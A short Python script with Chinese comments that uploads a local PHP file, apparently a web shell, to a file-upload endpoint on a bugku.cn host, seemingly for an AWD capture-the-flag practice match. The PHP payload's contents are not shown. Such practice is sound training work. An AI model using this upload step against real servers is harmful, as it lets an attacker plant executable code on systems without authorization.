import requests

# 服务器的上传接口地址
upload_url = 'http://192-168-1-13.pvp4014.bugku.cn/game/index.php?file=a'

# 要上传的文件路径
file_path = 'C:\\Users\\11978\\Desktop\\awd\\新awd\\22.php'

# 构建文件上传的字典
files = {
    'file': ('22.php', open(file_path, 'rb'), 'application/x-httpd-php')
}


response = requests.post(upload_url, files=files)

# 检查响应
if response.status_code == 200:
    print('File uploaded successfully.')
else:
    print('Failed to upload file:', response.text)